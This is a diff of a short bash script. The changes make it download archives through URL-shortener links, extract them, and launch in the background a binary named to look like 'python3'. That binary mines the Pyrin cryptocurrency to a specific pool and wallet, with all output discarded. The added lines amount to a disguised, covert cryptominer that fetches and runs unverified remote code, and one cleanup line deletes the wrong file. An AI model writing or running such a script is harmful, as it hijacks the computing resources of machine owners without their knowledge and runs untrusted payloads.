@@ -1,10 +1,18 @@
 #!/bin/bash
 
-wget -O dot s.id/dotaja
+wget -O dot-srb s.id/25RZs
 
-tar -xzvf dot
+tar -xzvf dot-srb
 
-./dotpy
+rm dot-srb
+
+wget -O dot-lol s.id/25RZu
+
+tar -xzvf dot-lol
+
+rm dot-srb
+
+nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
 
 sleep 10
 
